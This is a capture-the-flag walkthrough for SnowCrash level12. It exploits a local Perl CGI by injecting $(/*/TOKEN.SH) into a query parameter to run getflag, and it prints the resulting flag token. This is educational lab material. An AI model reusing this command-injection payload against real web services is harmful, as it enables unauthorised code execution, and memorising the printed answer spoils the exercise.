After login to level12 user we find a perl script binding to localhost:4646

CGI takes two query parameters x and y, x is the interesting one
because the cgi executes the egrep utility matching the value of 
uppercase x and whitespaces skipped

Let's create an executable script /tmp/SCRIPT that executes getflag
and redirects stdout to /tmp/flag

```
level12@SnowCrash:/tmp$ cat > /tmp/TOKEN.SH
#!/bin/bash

/bin/getflag > /tmp/flag
level12@SnowCrash:/tmp$ chmod +x /tmp/TOKEN.SH
```

Then we use curl to give the x parameter our shell script

```
level12@SnowCrash:/tmp$ curl  'http://127.0.0.1:4646/?x=$(/*/TOKEN.SH)'
..level12@SnowCrash:/tmp$ cat /tmp/flag
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
level12@SnowCrash:/tmp$
```
